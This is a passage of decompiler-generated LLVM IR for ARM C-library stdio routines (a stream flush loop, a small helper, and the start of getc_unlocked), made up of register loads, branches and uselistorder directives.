  %v0_188c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_188c4.pre = load i32, i32* @r4, align 4
  %v1_188c0 = inttoptr i32 %v0_188c0.pre to i32*
  %v2_188c0 = load i32, i32* %v1_188c0, align 4
  store i32 %v2_188c0, i32* %r3.global-to-local, align 4
  %v3_188c4 = icmp uge i32 %v2_188c0, %v1_188c4.pre
  store i1 %v3_188c4, i1* %cpsr_c.global-to-local, align 1
  %v9_188c4 = icmp eq i32 %v2_188c0, %v1_188c4.pre
  br i1 %v9_188c4, label %dec_label_pc_188cc, label %dec_label_pc_188e4

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188cc
  %v0_188e0 = load i32, i32* @r4, align 4
  store i32 %v0_188e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_188e4:                               ; preds = %dec_label_pc_188b4, %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge, %dec_label_pc_188e0
  %v0_188ec = phi i32 [ %v0_188e0, %dec_label_pc_188e0 ], [ %v2_188c0111, %dec_label_pc_188b4 ], [ %v2_188c0, %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge ]
  %v1_188e4 = phi i32 [ %v0_188e0, %dec_label_pc_188e0 ], [ %v2_188b4, %dec_label_pc_188b4 ], [ %v1_188c4.pre, %dec_label_pc_188cc.dec_label_pc_188c0_crit_edge ]
  %v3_188e4 = icmp uge i32 %v0_188ec, %v1_188e4
  store i1 %v3_188e4, i1* %cpsr_c.global-to-local, align 1
  %v9_188e4 = icmp eq i32 %v0_188ec, %v1_188e4
  br i1 %v9_188e4, label %dec_label_pc_188ec, label %dec_label_pc_188e4.dec_label_pc_188b4_crit_edge

dec_label_pc_188e4.dec_label_pc_188b4_crit_edge:  ; preds = %dec_label_pc_188e4
  %v0_188b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_188b4

dec_label_pc_188ec:                               ; preds = %dec_label_pc_188e4
  %v2_188ec = icmp ne i32 %v1_188e4, 0
  store i1 %v2_188ec, i1* %cpsr_c.global-to-local, align 1
  %v7_188f0 = icmp slt i32 %v1_188e4, 2
  br i1 %v7_188f0, label %dec_label_pc_1890cthread-pre-split, label %dec_label_pc_188f4

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188ec
  %v0_188f4 = load i32, i32* @r7, align 4
  store i32 %v0_188f4, i32* %r0.global-to-local, align 4
  %v0_188f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_188f8 = add i32 %v0_188f8, 129
  store i32 %v1_188f8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1890cthread-pre-split

dec_label_pc_1890cthread-pre-split:               ; preds = %dec_label_pc_188ec, %dec_label_pc_188f4
  %v0_18a58.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1890c

dec_label_pc_1890c:                               ; preds = %dec_label_pc_1890cthread-pre-split, %dec_label_pc_1888c
  %v0_18a58.pr = phi i32 [ %v0_18a58.pr.pr, %dec_label_pc_1890cthread-pre-split ], [ %v2_188a4, %dec_label_pc_1888c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a5818 = icmp eq i32 %v0_18a58.pr, 0
  br i1 %v2_18a5818, label %dec_label_pc_18a60, label %dec_label_pc_1891c

dec_label_pc_1891c:                               ; preds = %dec_label_pc_1890c, %dec_label_pc_18a54
  %v0_18944 = phi i32 [ %v3_18a54, %dec_label_pc_18a54 ], [ %v0_18a58.pr, %dec_label_pc_1890c ]
  %v1_1891c = inttoptr i32 %v0_18944 to i16*
  %v2_1891c = load i16, i16* %v1_1891c, align 2
  %v3_1891c = zext i16 %v2_1891c to i32
  store i32 %v3_1891c, i32* %r3.global-to-local, align 4
  %v1_18920 = and i32 %v3_1891c, 64
  %v2_18920 = icmp eq i32 %v1_18920, 0
  br i1 %v2_18920, label %dec_label_pc_18a54, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %dec_label_pc_1891c
  %v0_18928 = load i32, i32* @r6, align 4
  %v1_18928 = load i32, i32* %sb.global-to-local, align 4
  %v2_18928 = add i32 %v1_18928, %v0_18928
  %v3_18928 = inttoptr i32 %v2_18928 to i32*
  %v4_18928 = load i32, i32* %v3_18928, align 4
  store i32 %v4_18928, i32* %r3.global-to-local, align 4
  %v1_1892c = inttoptr i32 %v4_18928 to i32*
  %v2_1892c = load i32, i32* %v1_1892c, align 4
  store i32 %v2_1892c, i32* %r3.global-to-local, align 4
  %v2_18930 = icmp ugt i32 %v2_1892c, 1
  store i1 %v2_18930, i1* %cpsr_c.global-to-local, align 1
  %v7_18930 = icmp eq i32 %v2_1892c, 2
  br i1 %v7_18930, label %dec_label_pc_18994, label %dec_label_pc_18938

dec_label_pc_18938:                               ; preds = %dec_label_pc_18928
  %v1_18938 = add i32 %v0_18944, 64
  %v2_18938 = inttoptr i32 %v1_18938 to i32*
  %v3_18938 = load i32, i32* %v2_18938, align 4
  store i32 %v3_18938, i32* %r3.global-to-local, align 4
  %v1_1893c = load i32, i32* %r8.global-to-local, align 4
  %v3_1893c = icmp uge i32 %v3_18938, %v1_1893c
  store i1 %v3_1893c, i1* %cpsr_c.global-to-local, align 1
  %v9_1893c = icmp eq i32 %v3_18938, %v1_1893c
  br i1 %v9_1893c, label %dec_label_pc_18988, label %dec_label_pc_18944

dec_label_pc_18944:                               ; preds = %dec_label_pc_18938
  %v1_18944 = add i32 %v0_18944, 56
  store i32 %v1_18944, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_18944, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1895486 = inttoptr i32 %v1_18944 to i32*
  %v2_1895487 = load i32, i32* %v1_1895486, align 4
  store i32 %v2_1895487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1895894 = icmp eq i32 %v2_1895487, 0
  br i1 %v9_1895894, label %dec_label_pc_18960, label %dec_label_pc_18978

dec_label_pc_18960:                               ; preds = %dec_label_pc_18944, %dec_label_pc_18960.dec_label_pc_18954_crit_edge
  %v0_1896095 = phi i32 [ %v1_18958.pre, %dec_label_pc_18960.dec_label_pc_18954_crit_edge ], [ 0, %dec_label_pc_18944 ]
  store i32 %v0_1896095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18970 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18970, label %dec_label_pc_18974, label %dec_label_pc_18960.dec_label_pc_18954_crit_edge

dec_label_pc_18960.dec_label_pc_18954_crit_edge:  ; preds = %dec_label_pc_18960
  %v0_18954.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18958.pre = load i32, i32* @r4, align 4
  %v1_18954 = inttoptr i32 %v0_18954.pre to i32*
  %v2_18954 = load i32, i32* %v1_18954, align 4
  store i32 %v2_18954, i32* %r3.global-to-local, align 4
  %v3_18958 = icmp uge i32 %v2_18954, %v1_18958.pre
  store i1 %v3_18958, i1* %cpsr_c.global-to-local, align 1
  %v9_18958 = icmp eq i32 %v2_18954, %v1_18958.pre
  br i1 %v9_18958, label %dec_label_pc_18960, label %dec_label_pc_18978

dec_label_pc_18974:                               ; preds = %dec_label_pc_18960
  %v0_18974 = load i32, i32* @r4, align 4
  store i32 %v0_18974, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18978:                               ; preds = %dec_label_pc_18944, %dec_label_pc_18960.dec_label_pc_18954_crit_edge, %dec_label_pc_18974
  %v0_18978 = phi i32 [ %v0_18974, %dec_label_pc_18974 ], [ %v2_1895487, %dec_label_pc_18944 ], [ %v2_18954, %dec_label_pc_18960.dec_label_pc_18954_crit_edge ]
  %v1_18978 = phi i32 [ %v0_18974, %dec_label_pc_18974 ], [ 0, %dec_label_pc_18944 ], [ %v1_18958.pre, %dec_label_pc_18960.dec_label_pc_18954_crit_edge ]
  %v3_18978 = icmp uge i32 %v0_18978, %v1_18978
  store i1 %v3_18978, i1* %cpsr_c.global-to-local, align 1
  %v9_18978 = icmp eq i32 %v0_18978, %v1_18978
  br i1 %v9_18978, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_18978
  %v1_1897c = load i32, i32* @r7, align 4
  store i32 %v1_1897c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_18978, %bb69
  %v1_18980 = xor i1 %v9_18978, true
  call void @__pseudo_cond_branch(i1 %v1_18980, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_18984 = load i32, i32* %r8.global-to-local, align 4
  %v1_18984 = load i32, i32* @r5, align 4
  %v2_18984 = add i32 %v1_18984, 64
  %v3_18984 = inttoptr i32 %v2_18984 to i32*
  store i32 %v0_18984, i32* %v3_18984, align 4
  %v0_18988.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18988

dec_label_pc_18988:                               ; preds = %dec_label_pc_18938, %bb70
  %v0_18988 = phi i32 [ %v0_18944, %dec_label_pc_18938 ], [ %v0_18988.pre, %bb70 ]
  %v1_18988 = add i32 %v0_18988, 60
  %v2_18988 = inttoptr i32 %v1_18988 to i32*
  %v3_18988 = load i32, i32* %v2_18988, align 4
  %v1_1898c = add i32 %v3_18988, 1
  store i32 %v1_1898c, i32* %r3.global-to-local, align 4
  store i32 %v1_1898c, i32* %v2_18988, align 4
  %v0_18994.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_18928, %dec_label_pc_18988
  %v0_189ac = phi i32 [ %v0_18944, %dec_label_pc_18928 ], [ %v0_18994.pre, %dec_label_pc_18988 ]
  %v1_18994 = inttoptr i32 %v0_189ac to i16*
  %v2_18994 = load i16, i16* %v1_18994, align 2
  %v3_18994 = zext i16 %v2_18994 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1899c = or i32 %v3_18994, %stack_var_-44.1
  %v1_189a0 = xor i32 %v2_1899c, 320
  store i32 %v1_189a0, i32* %r3.global-to-local, align 4
  %v1_189a4 = and i32 %v1_189a0, 832
  %v2_189a4 = icmp eq i32 %v1_189a4, 0
  br i1 %v2_189a4, label %dec_label_pc_189ac, label %bb71

dec_label_pc_189ac:                               ; preds = %dec_label_pc_18994
  store i32 %v0_189ac, i32* %r0.global-to-local, align 4
  %v1_189b0 = call i32 @__stdio_wcommit(i32 %v0_189ac)
  store i32 %v1_189b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189b4 = icmp eq i32 %v1_189b0, 0
  br i1 %v2_189b4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_189ac
  %v1_189b8 = load i32, i32* @r5, align 4
  %v2_189b8 = inttoptr i32 %v1_189b8 to i16*
  %v3_189b8 = load i16, i16* %v2_189b8, align 2
  %v4_189b8 = zext i16 %v3_189b8 to i32
  store i32 %v4_189b8, i32* %r3.global-to-local, align 4
  %v2_189bc = add i32 %v1_189b8, 8
  %v3_189bc = inttoptr i32 %v2_189bc to i32*
  %v4_189bc = load i32, i32* %v3_189bc, align 4
  store i32 %v4_189bc, i32* %r2.global-to-local, align 4
  %v2_189c0 = and i32 %v4_189b8, 65471
  store i32 %v2_189c0, i32* %r3.global-to-local, align 4
  %v3_189c4 = add i32 %v1_189b8, 28
  %v4_189c4 = inttoptr i32 %v3_189c4 to i32*
  store i32 %v4_189bc, i32* %v4_189c4, align 4
  %v1_189c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_189c8 = trunc i32 %v1_189c8 to i16
  %v3_189c8 = load i32, i32* @r5, align 4
  %v4_189c8 = inttoptr i32 %v3_189c8 to i16*
  store i16 %v2_189c8, i16* %v4_189c8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_189ac
  %v1_189cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_189cc, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_18994, %.thread7
  %v0_189d0 = load i32, i32* @r6, align 4
  %v1_189d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_189d0 = add i32 %v1_189d0, %v0_189d0
  %v3_189d0 = inttoptr i32 %v2_189d0 to i32*
  %v4_189d0 = load i32, i32* %v3_189d0, align 4
  store i32 %v4_189d0, i32* %r3.global-to-local, align 4
  %v1_189d4 = inttoptr i32 %v4_189d0 to i32*
  %v2_189d4 = load i32, i32* %v1_189d4, align 4
  store i32 %v2_189d4, i32* %r3.global-to-local, align 4
  %v2_189d8 = icmp ugt i32 %v2_189d4, 1
  store i1 %v2_189d8, i1* %cpsr_c.global-to-local, align 1
  %v7_189d8 = icmp eq i32 %v2_189d4, 2
  br i1 %v7_189d8, label %dec_label_pc_18a54, label %dec_label_pc_189e0

dec_label_pc_189e0:                               ; preds = %bb71
  %v0_189e0 = load i32, i32* @r5, align 4
  %v1_189e0 = add i32 %v0_189e0, 60
  %v2_189e0 = inttoptr i32 %v1_189e0 to i32*
  %v3_189e0 = load i32, i32* %v2_189e0, align 4
  %v1_189e4 = add i32 %v3_189e0, -1
  store i32 %v1_189e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189e8 = icmp eq i32 %v1_189e4, 0
  store i32 %v1_189e4, i32* %v2_189e0, align 4
  br i1 %v2_189e8, label %dec_label_pc_189f4, label %dec_label_pc_18a54

dec_label_pc_189f4:                               ; preds = %dec_label_pc_189e0
  %v0_189f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_189f4 = load i32, i32* @r5, align 4
  %v2_189f4 = add i32 %v1_189f4, 64
  %v3_189f4 = inttoptr i32 %v2_189f4 to i32*
  store i32 %v0_189f4, i32* %v3_189f4, align 4
  %v0_189f8 = load i32, i32* @r5, align 4
  %v1_189f8 = add i32 %v0_189f8, 56
  store i32 %v1_189f8, i32* @r7, align 4
  br label %dec_label_pc_189fc

dec_label_pc_189fc:                               ; preds = %dec_label_pc_18a2c.dec_label_pc_189fc_crit_edge, %dec_label_pc_189f4
  %v0_18a04 = phi i32 [ %v0_18a04.pre, %dec_label_pc_18a2c.dec_label_pc_189fc_crit_edge ], [ %v1_189f8, %dec_label_pc_189f4 ]
  %v0_189fc = phi i32 [ %v0_189fc.pre, %dec_label_pc_18a2c.dec_label_pc_189fc_crit_edge ], [ %v0_189f8, %dec_label_pc_189f4 ]
  %v1_189fc = add i32 %v0_189fc, 56
  %v2_189fc = inttoptr i32 %v1_189fc to i32*
  %v3_189fc = load i32, i32* %v2_189fc, align 4
  store i32 %v3_189fc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18a04, i32* %r2.global-to-local, align 4
  %v1_18a0897 = inttoptr i32 %v0_18a04 to i32*
  %v2_18a0898 = load i32, i32* %v1_18a0897, align 4
  store i32 %v2_18a0898, i32* %r3.global-to-local, align 4
  %v3_18a0c100 = icmp uge i32 %v2_18a0898, %v3_189fc
  store i1 %v3_18a0c100, i1* %cpsr_c.global-to-local, align 1
  %v9_18a0c106 = icmp eq i32 %v2_18a0898, %v3_189fc
  br i1 %v9_18a0c106, label %dec_label_pc_18a14, label %dec_label_pc_18a2c

dec_label_pc_18a14:                               ; preds = %dec_label_pc_189fc, %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge
  %v0_18a14107 = phi i32 [ %v1_18a0c.pre, %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge ], [ %v3_189fc, %dec_label_pc_189fc ]
  store i32 %v0_18a14107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18a24 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18a24, label %dec_label_pc_18a28, label %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge

dec_label_pc_18a14.dec_label_pc_18a08_crit_edge:  ; preds = %dec_label_pc_18a14
  %v0_18a08.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18a0c.pre = load i32, i32* @r4, align 4
  %v1_18a08 = inttoptr i32 %v0_18a08.pre to i32*
  %v2_18a08 = load i32, i32* %v1_18a08, align 4
  store i32 %v2_18a08, i32* %r3.global-to-local, align 4
  %v3_18a0c = icmp uge i32 %v2_18a08, %v1_18a0c.pre
  store i1 %v3_18a0c, i1* %cpsr_c.global-to-local, align 1
  %v9_18a0c = icmp eq i32 %v2_18a08, %v1_18a0c.pre
  br i1 %v9_18a0c, label %dec_label_pc_18a14, label %dec_label_pc_18a2c

dec_label_pc_18a28:                               ; preds = %dec_label_pc_18a14
  %v0_18a28 = load i32, i32* @r4, align 4
  store i32 %v0_18a28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18a2c

dec_label_pc_18a2c:                               ; preds = %dec_label_pc_189fc, %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge, %dec_label_pc_18a28
  %v0_18a34 = phi i32 [ %v0_18a28, %dec_label_pc_18a28 ], [ %v2_18a0898, %dec_label_pc_189fc ], [ %v2_18a08, %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge ]
  %v1_18a2c = phi i32 [ %v0_18a28, %dec_label_pc_18a28 ], [ %v3_189fc, %dec_label_pc_189fc ], [ %v1_18a0c.pre, %dec_label_pc_18a14.dec_label_pc_18a08_crit_edge ]
  %v3_18a2c = icmp uge i32 %v0_18a34, %v1_18a2c
  store i1 %v3_18a2c, i1* %cpsr_c.global-to-local, align 1
  %v9_18a2c = icmp eq i32 %v0_18a34, %v1_18a2c
  br i1 %v9_18a2c, label %dec_label_pc_18a34, label %dec_label_pc_18a2c.dec_label_pc_189fc_crit_edge

dec_label_pc_18a2c.dec_label_pc_189fc_crit_edge:  ; preds = %dec_label_pc_18a2c
  %v0_189fc.pre = load i32, i32* @r5, align 4
  %v0_18a04.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_189fc

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a2c
  %v2_18a34 = icmp ne i32 %v1_18a2c, 0
  store i1 %v2_18a34, i1* %cpsr_c.global-to-local, align 1
  %v7_18a38 = icmp slt i32 %v1_18a2c, 2
  br i1 %v7_18a38, label %dec_label_pc_18a54, label %dec_label_pc_18a3c

dec_label_pc_18a3c:                               ; preds = %dec_label_pc_18a34
  %v0_18a3c = load i32, i32* @r5, align 4
  %v1_18a3c = add i32 %v0_18a3c, 56
  store i32 %v1_18a3c, i32* %r0.global-to-local, align 4
  %v0_18a40 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a40 = add i32 %v0_18a40, 129
  store i32 %v1_18a40, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18a54

dec_label_pc_18a54:                               ; preds = %dec_label_pc_189e0, %dec_label_pc_18a3c, %dec_label_pc_18a34, %bb71, %dec_label_pc_1891c
  %v0_18a54 = load i32, i32* @r5, align 4
  %v1_18a54 = add i32 %v0_18a54, 32
  %v2_18a54 = inttoptr i32 %v1_18a54 to i32*
  %v3_18a54 = load i32, i32* %v2_18a54, align 4
  store i32 %v3_18a54, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a58 = icmp eq i32 %v3_18a54, 0
  br i1 %v2_18a58, label %dec_label_pc_18a60, label %dec_label_pc_1891c

dec_label_pc_18a60:                               ; preds = %dec_label_pc_18a54, %dec_label_pc_1890c
  %v0_18a60 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_18a60, i32* %r0.global-to-local, align 4
  %v0_18a9c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_18a68:                               ; preds = %dec_label_pc_18744
  %v3_18a68 = load i16, i16* %arg1, align 2
  %v4_18a68 = zext i16 %v3_18a68 to i32
  %v1_18a6c = and i32 %v4_18a68, 64
  store i32 %v1_18a6c, i32* %r3.global-to-local, align 4
  %v2_18a6c = icmp eq i32 %v1_18a6c, 0
  br i1 %v2_18a6c, label %bb72, label %dec_label_pc_18a78

bb72:                                             ; preds = %dec_label_pc_18a68
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_18a78:                               ; preds = %dec_label_pc_18a68
  %v2_18a78 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_18a78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a7c = icmp eq i32 %v2_18a78, 0
  br i1 %v2_18a7c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_18a78
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_18a78
  %v1_18a80 = load i32, i32* @r4, align 4
  %v2_18a80 = inttoptr i32 %v1_18a80 to i16*
  %v3_18a80 = load i16, i16* %v2_18a80, align 2
  %v4_18a80 = zext i16 %v3_18a80 to i32
  store i32 %v4_18a80, i32* %r3.global-to-local, align 4
  %v2_18a84 = add i32 %v1_18a80, 8
  %v3_18a84 = inttoptr i32 %v2_18a84 to i32*
  %v4_18a84 = load i32, i32* %v3_18a84, align 4
  store i32 %v4_18a84, i32* %r2.global-to-local, align 4
  %v2_18a88 = and i32 %v4_18a80, 65471
  store i32 %v2_18a88, i32* %r3.global-to-local, align 4
  %v2_18a8c = trunc i32 %v2_18a88 to i16
  store i16 %v2_18a8c, i16* %v2_18a80, align 2
  %v1_18a90 = load i32, i32* %r2.global-to-local, align 4
  %v2_18a90 = load i32, i32* @r4, align 4
  %v3_18a90 = add i32 %v2_18a90, 28
  %v4_18a90 = inttoptr i32 %v3_18a90 to i32*
  store i32 %v1_18a90, i32* %v4_18a90, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_18a60, %.thread14
  %v0_18a9c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_18a9c.pre, %dec_label_pc_18a60 ], [ 0, %.thread14 ]
  store i32 %v0_18a9c, i32* %r0.global-to-local, align 4
  store i32 %v6_18718, i32* %r5.global-to-local, align 4
  ret i32 %v0_18a9c

; uselistorder directives
  uselistorder i32 %v0_18a9c, { 1, 0 }
  uselistorder i32 %v3_18a54, { 1, 2, 0 }
  uselistorder i32 %v0_18a28, { 1, 0, 2 }
  uselistorder i32 %v1_18a0c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_189ac, { 1, 0, 2 }
  uselistorder i32 %v0_18974, { 1, 0, 2 }
  uselistorder i32 %v1_18958.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1893c, { 1, 0 }
  uselistorder i32 %v0_188e0, { 1, 0, 2 }
  uselistorder i32 %v1_188c4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_188b4, { 1, 0 }
  uselistorder i32 %v0_18878, { 1, 0, 2 }
  uselistorder i32 %v1_1885c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_18844, { 1, 0 }
  uselistorder i32 %v0_1880c, { 1, 0, 2 }
  uselistorder i32 %v1_187f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_187e0, { 1, 0 }
  uselistorder i32 %v0_1879c, { 1, 0, 2 }
  uselistorder i32 %v1_18780.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_18758, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 320, { 1, 0, 2 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18a54, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_18a2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18a14, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18994, { 1, 0 }
  uselistorder label %dec_label_pc_18988, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_18978, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18960, { 1, 0 }
  uselistorder label %dec_label_pc_1891c, { 1, 0 }
  uselistorder label %dec_label_pc_1890cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_188e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_188cc, { 1, 0 }
  uselistorder label %dec_label_pc_1888c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1887c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18864, { 1, 0 }
  uselistorder label %dec_label_pc_18838, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18810, { 2, 1, 0 }
  uselistorder label %dec_label_pc_187f8, { 1, 0 }
  uselistorder label %dec_label_pc_187b0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_187a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18788, { 1, 0 }
  uselistorder label %dec_label_pc_18754, { 1, 0 }
}

define i32 @function_18ab0(i32 %arg1) local_unnamed_addr {
dec_label_pc_18ab0:
  %v0_18ab0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18ab0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18ab0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18ab0, %bb
  %v10_18ac0 = phi i32 [ %arg1, %dec_label_pc_18ab0 ], [ 0, %bb ]
  ret i32 %v10_18ac0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18ac4 = load i32, i32* @r4, align 4
  store i32 %v3_18ac4, i32* %stack_var_-12, align 4
  %v6_18ac4 = load i32, i32* @r5, align 4
  %v9_18ac4 = load i32, i32* @lr, align 4
  %v0_18ac8 = load i32, i32* @r0, align 4
  %v1_18ac8 = add i32 %v0_18ac8, 16
  %v2_18ac8 = inttoptr i32 %v1_18ac8 to i32*
  %v3_18ac8 = load i32, i32* %v2_18ac8, align 4
  store i32 %v3_18ac8, i32* %r2.global-to-local, align 4
  %v1_18acc = add i32 %v0_18ac8, 24
  %v2_18acc = inttoptr i32 %v1_18acc to i32*
  %v3_18acc = load i32, i32* %v2_18acc, align 4
  %v3_18ad0 = icmp ult i32 %v3_18ac8, %v3_18acc
  store i32 %v0_18ac8, i32* @r4, align 4
  br i1 %v3_18ad0, label %bb, label %dec_label_pc_18af0

bb:                                               ; preds = %entry
  %v2_18adc = inttoptr i32 %v3_18ac8 to i8*
  %v3_18adc = load i8, i8* %v2_18adc, align 1
  %v4_18adc = zext i8 %v3_18adc to i32
  store i32 %v4_18adc, i32* %r0.global-to-local, align 4
  %v6_18adc = add i32 %v3_18ac8, 1
  store i32 %v6_18adc, i32* %r2.global-to-local, align 4
  store i32 %v6_18adc, i32* %v2_18ac8, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18af0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r5, align 4
  %v1_18af0 = inttoptr i32 %v0_18ac8 to i16*
